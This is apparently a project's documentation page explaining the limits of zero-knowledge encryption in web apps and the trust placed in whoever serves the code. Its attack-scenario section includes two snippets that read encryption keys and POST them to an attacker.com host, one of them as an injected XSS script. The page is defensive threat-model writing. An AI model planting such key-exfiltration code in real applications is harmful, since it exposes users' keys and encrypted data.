# Understanding Zero-Knowledge in Web Apps

**Important:** There's a critical distinction between **protocol-level
zero-knowledge** and **implementation-level trust**. You need to understand
both.

## Protocol-Level Zero-Knowledge: ✅ Trustless

Agam Space is cryptographically zero-knowledge by design.

**What this means:**

- Server never receives your master password or encryption keys
- All encryption happens in your browser (client-side)
- Database compromise reveals only encrypted data
- Server admin cannot decrypt your files
- This is **cryptographically zero-knowledge**

**What's protected:**

- ✅ Server database breach
- ✅ Curious server administrators
- ✅ Storage compromise

## Implementation-Level Trust: ⚠️ Not Trustless

**The reality of web-based E2EE:**

Unlike native apps (desktop/mobile), web apps deliver code on every page load.
**You must trust the server to deliver correct JavaScript.**

**What this means:**

- Server controls the HTML and JavaScript sent to your browser
- A malicious server could serve backdoored code to steal your keys
- Security vulnerabilities (like XSS) could be exploited to inject malicious
  code
- **You are trusting the server operator and the application's security**

**Example attack scenarios:**

```javascript
// Malicious server could inject:
const cmk = ClientRegistry.getKeyManager().getCMK();
fetch('https://attacker.com/steal', { method: 'POST', body: cmk });

// Or if an XSS vulnerability exists, attacker could exploit it:
<script>
  const keys = sessionStorage.getItem('encrypted-cmk');
  fetch('https://attacker.com/steal', { method: 'POST', body: keys });
</script>
```

If the server serves malicious code or if a security vulnerability exists and is
exploited, your keys can be compromised.

## Reducing (Not Eliminating) Trust

**What we currently have:**

- **Open Source** - Code is publicly auditable on GitHub
- **HTTPS Only** - Prevents network-level tampering

**What I'm working on to improve this:**

I will continue working on implementation security through measures like:

- **Content Security Policy (CSP)** - Prevents XSS attacks by restricting which
  scripts can execute; also limits what a compromised or malicious script can do
- **Input Validation & Sanitization** - Prevents malicious code injection
- **Subresource Integrity (SRI)** - Verifies external libraries haven't been
  tampered with during delivery
- **Code audits and reviews** - Independent security experts reviewing the code
  for vulnerabilities
- **Security-focused development** - Following OWASP guidelines and best
  practices

**What these measures accomplish:**

- **XSS vulnerabilities:** Can be eliminated with proper implementation
- **Malicious server operator:** Can be mitigated (CSP/SRI make it harder) but
  not fully prevented

A determined malicious server operator can still bypass these protections, but
they significantly raise the bar.

## What This Means for You

**If you self-host:**

- You control the server
- You trust yourself not to inject malicious code
- Zero-knowledge architecture protects against external database breaches
- **This is the intended use case**

**If you use someone else's instance:**

- You trust that operator not to modify the code
- You trust their server security
- You trust they won't be compelled to backdoor the application
- **Consider carefully who you trust**

## How Does This Compare to Others?

**Other web-based E2EE apps:**

- Face the same limitation - server controls code delivery
- Users must trust the service provider
- Common mitigations: security audits, reputation, legal frameworks,
  transparency reports

**Native E2EE apps (desktop/mobile):**

- Code delivered once during installation, not on every use
- Operating system verifies code signature
- No server controls the code after installation
- Truly trustless from a code delivery perspective
- But less convenient (must install, update manually)

## The Honest Truth

**Web-based E2EE involves a trade-off:**

- **Convenience:** Access from any browser, no installation
- **Trust:** You rely on the server to deliver unmodified code

This is not unique to Agam Space - all web-based E2EE apps face this same
challenge.

**What you should know:**

- I will continue improving implementation security
- Code remains open source for auditing
- Security is complex and evolving - I'm learning and improving
- I will be transparent about limitations

**Your choice:**

- Self-host if you want full control
- Trust someone else's instance if you trust the operator

There is no perfect solution - only trade-offs.
